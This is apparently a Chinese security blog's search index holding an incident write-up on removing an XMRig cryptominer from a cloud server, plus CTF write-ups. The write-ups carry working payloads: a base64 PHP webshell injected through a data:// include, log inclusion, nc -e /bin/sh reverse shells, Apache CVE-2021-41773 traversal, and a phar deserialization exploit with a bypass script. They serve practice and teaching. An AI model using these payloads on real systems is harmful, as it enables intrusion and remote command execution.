<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次挖矿木马解决过程</title>
    <link href="/2022/11/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E8%A7%A3%E5%86%B3%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/11/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E8%A7%A3%E5%86%B3%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>11月3号的时候腾讯云曾发过印度IP登录的消息，当时想的是可能是自己挂的梯子<br>也感觉没人去黑我这小破机子，就没在意，没想到还真有人动  </p><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><h3 id="前"><a href="#前" class="headerlink" title="前"></a>前</h3><p>今天11点23分腾讯云发来了疑似挖矿行为的通知，隔了三分钟又发来了请求恶意IP的通知<br>恶意请求的IP是<code>178.128.242.134</code>和<code>199.247.27.41</code><br><img src="http://81.70.101.23:11111/i/2022/11/08/jwg9ff_0.png"><br>用<a href="https://www.shodan.io/">撒旦</a>追一下，域名对的是donate.v2.xmrig.com和donate.ssl.xmrig.com<br><img src="http://81.70.101.23:11111/i/2022/11/08/j5qxnj_0.png"></p><p>上xmrig.com去看看，一眼miner、mine、ssl等字眼，那确实是被挖矿了<br><img src="http://81.70.101.23:11111/i/2022/11/08/iueq1w_0.png"><br>过了大概十分钟，刚看了一下矿池网站，腾讯云就发通知说已经清楚恶意文件<code>/tmp/khnugtaskd</code><br>以为已经没事了，结果发现恶意域名的请求还在不断发出，也就是不断连接矿池挖矿ing</p><h3 id="中"><a href="#中" class="headerlink" title="中"></a>中</h3><p>只能自己排查了一下了<br>首先top -c查看一下cpu使用率，发现竟然只有2.7%左右</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">27529</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">982928</span>  <span class="hljs-number">43644</span>  <span class="hljs-number">17628</span> S   <span class="hljs-number">1</span>.<span class="hljs-number">3</span>  <span class="hljs-number">2</span>.<span class="hljs-number">3</span>   <span class="hljs-number">1</span>:<span class="hljs-number">04</span>.<span class="hljs-number">96</span> /usr/local/qcloud/YunJing/YDEyes/YDService                                                                        <br><span class="hljs-attribute">22694</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">1204556</span>   <span class="hljs-number">8888</span>   <span class="hljs-number">1980</span> S   <span class="hljs-number">0</span>.<span class="hljs-number">7</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">968</span>:<span class="hljs-number">15</span>.<span class="hljs-number">51</span> barad_agent                                                                                                       <br><span class="hljs-attribute">12048</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">160036</span>   <span class="hljs-number">2300</span>   <span class="hljs-number">1624</span> R   <span class="hljs-number">0</span>.<span class="hljs-number">3</span>  <span class="hljs-number">0</span>.<span class="hljs-number">1</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span>.<span class="hljs-number">09</span> top -c                                                                                                            <br><span class="hljs-attribute">1</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">193996</span>   <span class="hljs-number">6040</span>   <span class="hljs-number">3608</span> S   <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span>  <span class="hljs-number">58</span>:<span class="hljs-number">23</span>.<span class="hljs-number">14</span> /usr/lib/systemd/systemd --switched-root --system --deserialize <span class="hljs-number">22</span>   <br></code></pre></td></tr></table></figure><p>一般被挖矿的话cpu至少要到95%，这个倒很奇怪，也不排除这个挖矿木马被设置成这样防止cpu负载过高被检测出来<br>这里前两个进程都是腾讯云的安全进程，从top里看不到可疑的挖矿进程，不排除是挖矿木马已经篡改top命令实现进程隐藏<br>那尝试直接从入网出网禁一下IP</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">iptables -A INPUT -s donate<span class="hljs-selector-class">.ssl</span><span class="hljs-selector-class">.xmrig</span><span class="hljs-selector-class">.com</span> -j DROP<br>iptables -A OUTPUT -d donate<span class="hljs-selector-class">.ssl</span><span class="hljs-selector-class">.xmrig</span><span class="hljs-selector-class">.com</span> -j DROP<br></code></pre></td></tr></table></figure><p>但是还没用，恶意请求仍然在发出<br>后来想到既然有请求肯定能看见网络连接，试一下<code>netstat -napt</code></p><p>在一堆网络连接里果然找到了可疑的请求，和前面的恶意ip对的上，8080应该是v2的，443是ssl的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">1</span> <span class="hljs-number">10.0.24.13:47268</span>        <span class="hljs-number">194.40.243.73:8080</span>      SYN_SENT    <span class="hljs-number">24449</span>/khnugtaskd    <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">1</span> <span class="hljs-number">10.0.24.13:45150</span>        <span class="hljs-number">199.247.27.41:443</span>       SYN_SENT    <span class="hljs-number">24449</span>/khnugtaskd   <br></code></pre></td></tr></table></figure><p>找到了了PID是24449，用ps -ef -p PID查看一下进程详细信息，确认了恶意文件就是<code>/tmp/khnugtaskd</code><br>直接kill 9删除进程就完了<br>当时急着吃饭就没有查看这个进程有没有守护进程和计划任务<br>回来隔个半小时半天看一下，发现没有再请求了，确认没有守护进程没有计划任务就over了</p><h3 id="后"><a href="#后" class="headerlink" title="后"></a>后</h3><p>第一次应对攻击，还不太清楚这次是从哪进来的<br>不过平常为了ctf复现经常没用docker直接部署在端口，可能被扫了后门的密码</p><p>emmmm感觉还挺好玩的，对linux进行溯源，在腾讯云保存了个快照<br>以后有时间准备看看是哪个ip登录的，从哪个业务黑进来的，进行了哪些操作balabala</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow 七夕杯</title>
    <link href="/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/"/>
    <url>/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉不是特别难，但很多姿势很不戳<br><img src="http://81.70.101.23:11111/i/2022/08/11/1pmiqp_0.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>只能执行7字符以内的命令且没有回显</p><p>如果目录有写的权限时，可以利用<code>&gt;</code>写文件，然后将<code>ls -t</code>将写好的文件名再通过<code>&gt;</code>写入一个新的文件，执行新的文件<br>如果目录没有写的权限，可以通过POST发包，在&#x2F;tmp目录留下临时文件，再执行<code>. /t*/*</code>，刚好达到7个字符</p><p>本题经过测试应该没有写进当前目录的权限，所以post发个反弹shell的包<br><img src="http://81.70.101.23:11111/i/2022/08/06/lkh7n0_0.png"><br><img src="http://81.70.101.23:11111/i/2022/08/06/lkyys8_0.png"></p><h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$code</span>))&#123;<br><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$result=&#x27;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$code</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$result</span>);    <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$code</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$num1</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>];<br>    <span class="hljs-variable">$symbol</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;symbol&#x27;</span>];<br>    <span class="hljs-variable">$num2</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num1</span>) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num2</span>) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$symbol</span>) )&#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/!|@|#|\\$|\%|\^|\&amp;|\(|_|=|&#123;|&#x27;|&lt;|&gt;|\?|\?|\||`|~|\[/&quot;</span>, <span class="hljs-variable">$num1</span>.<span class="hljs-variable">$num2</span>.<span class="hljs-variable">$symbol</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[\+\-\*\/]$/&quot;</span>, <span class="hljs-variable">$symbol</span>))&#123;<br>        <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$num1</span><span class="hljs-subst">$symbol</span><span class="hljs-subst">$num2</span>&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要传入num1、symbol、num2</p><p>symbol只能为+ - * &#x2F; 中的一个，初步想法时*作为通配符，或者&#x2F;作为目录</p><p>由于num1、symbol、num2都过滤了括号，所以命令执行函数比如system，exec可以排除。过滤了单引号但没有过滤双引号，可以尝试使用include危险函数</p><p>组合后的$result&#x3D;include “&#x2F;something”</p><p>方法一：日志包含（$result&#x3D;include “&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log”）<br>payload为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">num1</span><span class="hljs-operator">=</span>include <span class="hljs-string">&quot;&amp;symbol=/&amp;num2=var/log/nginx/access.log&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://81.70.101.23:11111/i/2022/08/06/ltivwd_0.png"></p><p>方法二：包含伪协议（$result&#x3D;include “data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx”）<br>xxxx:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success! 命令执行result:\n&quot;</span>;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//base64：PD9waHAgZWNobyAic3VjY2VzcyEg5ZG95Luk5omn6KGMcmVzdWx0OlxuIjtAZXZhbCgkX0dFVFsnY21kJ10pOz8+</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">num1</span><span class="hljs-operator">=</span>include <span class="hljs-string">&quot;data:/&amp;symbol=/&amp;num2=text/plain;base64,PD9waHAgZWNobyAic3VjY2VzcyEg5ZG95Luk5omn6KGMcmVzdWx0OlxuIjtAZXZhbCgkX0dFVFsnY21kJ10pOz8+&quot;</span><br></code></pre></td></tr></table></figure><p>就可以执行任意命令了<br><img src="http://81.70.101.23:11111/i/2022/08/06/lszva3_0.png"><br><img src="http://81.70.101.23:11111/i/2022/08/06/lt10yz_0.png"><br><img src="http://81.70.101.23:11111/i/2022/08/06/lt23vo_0.png"></p><h3 id="easy-cmd"><a href="#easy-cmd" class="headerlink" title="easy_cmd"></a>easy_cmd</h3><p>只能使用ping、ls、nc、ifconfig四个命令，且没有回显<br>直接反弹shell<br><img src="http://81.70.101.23:11111/i/2022/08/06/lu3ihy_0.png"></p><p>但比较奇怪，<code>nc ip port -e /bin/sh</code>可以，但是<code>nc -e /bin/sh ip port</code>却不可以</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>听说是0解java题，还没来得及看，等一手wp</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#4</title>
    <link href="/2022/08/04/NSSCTF%20Round4/"/>
    <url>/2022/08/04/NSSCTF%20Round4/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大菜鸡大菜鸡<br><img src="http://81.70.101.23:11111/i/2022/08/11/1pfevw_0.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1zweb"><a href="#1zweb" class="headerlink" title="1zweb"></a>1zweb</h3><p>非预期解，读完index.php和upload.php后发现可以直接读&#x2F;flag<br><img src="http://81.70.101.23:11111/i/2022/08/04/ujuwdp_0.png"></p><p>据说出题人已经被打了 : )</p><h3 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h3><p>页面只有一句’It works!’，但发现环境使用的web服务器是apache2.4.49<br><img src="http://81.70.101.23:11111/i/2022/08/05/ipflc2_0.png"></p><p>同时扫到了&#x2F;cgi-bin&#x2F;目录<br><img src="http://81.70.101.23:11111/i/2022/08/05/iqmdss_0.png"></p><p>尝试apache路径穿越漏洞（CVE-2021-41773），但是在&#x2F;flag_is_here&#x2F;目录下还有四层目录，每层目录名字为0-9的数字，且每个尽头目录下有一个flag，但只有一个目录下的flag是真的</p><p>方法一：grep -r递归搜索<br><img src="http://81.70.101.23:11111/i/2022/08/05/ishlld_0.png"></p><p>方法二：cat根目录下的run.sh或者直接cat &#x2F;*看到设置的正确flag位置，再直接cat<br><img src="http://81.70.101.23:11111/i/2022/08/05/itnt9y_0.png"><br><img src="http://81.70.101.23:11111/i/2022/08/05/its6wk_0.png"></p><p>方法三：爆破<br><img src="http://81.70.101.23:11111/i/2022/08/05/iu6o9x_0.png"></p><h3 id="1zweb-revenge"><a href="#1zweb-revenge" class="headerlink" title="1zweb(revenge)"></a>1zweb(revenge)</h3><p>修复了第一题可以直接读&#x2F;flag，先读一下源码<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传异常&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)))&#123;<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$pos</span>)===<span class="hljs-string">&quot;integer&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ltj一眼就发现了phar&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;w&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$content</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传成功 ./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="hljs-variable">$extension</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php中有一个LoveNss类和eval函数，但没有unserialize函数，upload.php中’ltj一眼就发现了phar’，所以可以尝试用phar反序列化</p><p>1zweb.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoveNss</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;ljt=<span class="hljs-string">&quot;Misc&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;dky=<span class="hljs-string">&quot;Re&quot;</span>;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>但为了绕过__wakeup()，在winhex中将<code>O:7:&quot;LoveNss&quot;:3:</code>改为<code>O:7:&quot;LoveNss&quot;:4:</code>，并且upload.php中要求上传文件中不能存在<code>__HALT_COMPILER();</code>，将其gzip压缩即可绕过</p><p>重新生成phar签名并压缩：<br>change.py</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br>import gzip<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./phar.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>() <span class="hljs-comment"># 修改内容后的phar文件</span><br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>newf = s+sha1(s).digest()+h <span class="hljs-comment"># 数据 + 签名 + 类型 + GBMB</span><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;666.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># 写入新文件</span><br><br><span class="hljs-built_in">file</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./666.phar&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-comment">#打开文件</span><br>file_out = gzip.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./666.zip&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)<span class="hljs-comment">#创建压缩文件对象</span><br>file_out.writelines(<span class="hljs-built_in">file</span>)<br>file_out.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>将.zip改为.jpg即可上传，在index.php传入file参数</p><p><img src="http://81.70.101.23:11111/i/2022/08/05/k70nr5_0.png"></p><p><img src="http://81.70.101.23:11111/i/2022/08/05/j0wpn0_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022第六届强网杯CTF</title>
    <link href="/2022/08/03/2022%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFCTF/"/>
    <url>/2022/08/03/2022%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFCTF/</url>
    
